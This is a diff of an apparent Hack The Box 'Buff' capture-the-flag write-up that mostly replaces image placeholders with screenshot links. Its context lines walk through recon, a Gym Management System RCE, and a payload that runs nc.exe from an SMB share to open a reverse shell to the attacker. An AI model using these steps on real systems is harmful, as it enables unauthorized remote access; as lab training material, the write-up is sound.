@@ -20,21 +20,17 @@ We will see that the open ports are:
 - 8080/tcp http
 
 now we can do:
-
 ```bash
 nmap -sCV -p7680,8080 [IP]
 ```
 
-![Puertos](PENDIENTE)
+![Puertos](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Ports.PNG)
+
 
 We can then proceed by checking the web page that is hosted on port 8080 of the machine.
 
-![Pagina](Pendiente)
+![Pagina](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Captura.PNG)
 
-
-```bash
-nmap -sCV -p7680,8080 [IP]
-```
 After reviewing all sections of the website, we have not found anything interesting, except for a message in the "Contacts" section that mentions:
 
 -_"Made with Gym Management Software 1.0."_
@@ -46,7 +42,7 @@ For now we are going to use the **WFUZZ** tool to perform a search of the possib
 wfuzz --hc=404 -w [wordlist path] http://[IP]:8080/FUZZ
 ```
 
-![Upload](Pendiente)
+![Upload](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/Upload%20directory.PNG)
 
 As you can see, something that may interest us is that there is an *"upload"* directory. 
 _(We will use this directory later)_
@@ -55,7 +51,7 @@ _(We will use this directory later)_
 ****
 Let's go back to the message in the "Contacts" section that mentions:
 -_"Made with Gym Management Software 1.0."_
-**That is a good clue!**
+**That is a nice hint!**
 
 Because we can look for possible vulnerabilities reported in this software.
 Take a look at this code about Remote Code Execution without Authentication in the "Gym Management System 1.0" software.
@@ -141,7 +137,7 @@ if __name__ == "__main__":
 
 Once the above script has been executed we should be able to have a command execution through the browser
 
-![Kamehameha](Pendiente)
+![Kamehameha](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/kamehameha.PNG)
 
 Now it would be a good idea to get the "user flag" to get access to the system, one of the possible ways to do this is by getting a "reverse shell". 
 
@@ -154,7 +150,7 @@ Now, in the folder where the unzipped netcat is located, let's execute the comma
 ```bash
 smbserver.py smbFolder $(pwd) -smb2support
 ```
-![Smbserver](Pendiente)
+![Smbserver](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/smbserver.PNG)
 
 In this way we will go to the search engine and make the following request:
 ```bash
@@ -162,7 +158,7 @@ In this way we will go to the search engine and make the following request:
 ```
 Thus, we will see that the items that are part of the netcat folder will be listed 
 
-![dir smb](Pendiente)
+![dir smb](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/dir%20smb.PNG)
 
 Ahora, en nuestro entorno de linux nos pondremos en escucha por el puerto [PORT]
 ```bash
@@ -172,7 +168,7 @@ Así, vamos a pedir una "reverse shell" ejecutando en el buscador la siguiente p
 ```bash
 ...?telepathy=\\[Our IP]\smbFolder\nc.exe -e cmd [Our IP] [PORT]
 ```
-![reverse_shell](Pendiente)
+![reverse_shell](https://github.com/0xLJoseb/Apuntes/blob/main/Buff%20Writeup/Content%26/reverse_shell.PNG)
 
 
 The user flag is located at:
